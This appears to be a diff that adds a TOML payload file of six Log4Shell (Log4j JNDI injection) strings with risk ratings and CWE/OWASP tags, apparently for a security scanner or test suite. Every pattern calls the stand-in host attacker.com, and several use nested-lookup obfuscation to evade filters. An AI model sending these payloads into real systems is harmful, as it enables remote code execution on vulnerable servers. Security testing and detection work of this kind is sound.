@@ -1,0 +1,61 @@
+# Log4Shell (Log4j RCE) Payloads
+
+[[payloads]]
+id = "l4s-001"
+name = "Log4Shell JNDI LDAP"
+category = "Log4Shell"
+pattern = "${jndi:ldap://attacker.com/a}"
+description = "Log4j RCE via JNDI LDAP lookup"
+risk_level = "CRITICAL"
+cwe_id = "CWE-917"
+owasp_category = "A03:2021"
+
+[[payloads]]
+id = "l4s-002"
+name = "Log4Shell JNDI RMI"
+category = "Log4Shell"
+pattern = "${jndi:rmi://attacker.com/a}"
+description = "Log4j RCE via JNDI RMI lookup"
+risk_level = "CRITICAL"
+cwe_id = "CWE-917"
+owasp_category = "A03:2021"
+
+[[payloads]]
+id = "l4s-003"
+name = "Obfuscated Log4Shell"
+category = "Log4Shell"
+pattern = "${${lower:j}ndi:${lower:l}dap://attacker.com/a}"
+description = "Obfuscated Log4j RCE using nested lookups and transformations"
+risk_level = "CRITICAL"
+cwe_id = "CWE-917"
+owasp_category = "A03:2021"
+
+[[payloads]]
+id = "l4s-004"
+name = "Advanced Log4Shell Evasion"
+category = "Log4Shell"
+pattern = "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}"
+description = "Advanced Log4Shell evasion using recursive expansion"
+risk_level = "CRITICAL"
+cwe_id = "CWE-917"
+owasp_category = "A03:2021"
+
+[[payloads]]
+id = "l4s-005"
+name = "Log4Shell JNDI DNS"
+category = "Log4Shell"
+pattern = "${jndi:dns://attacker.com}"
+description = "Log4j RCE via JNDI DNS lookup"
+risk_level = "CRITICAL"
+cwe_id = "CWE-917"
+owasp_category = "A03:2021"
+
+[[payloads]]
+id = "l4s-006"
+name = "Log4Shell Environment Variable"
+category = "Log4Shell"
+pattern = "${${env:ENV_VAR:-j}ndi:ldap://attacker.com/a}"
+description = "Log4Shell with environment variable fallback"
+risk_level = "CRITICAL"
+cwe_id = "CWE-917"
+owasp_category = "A03:2021"
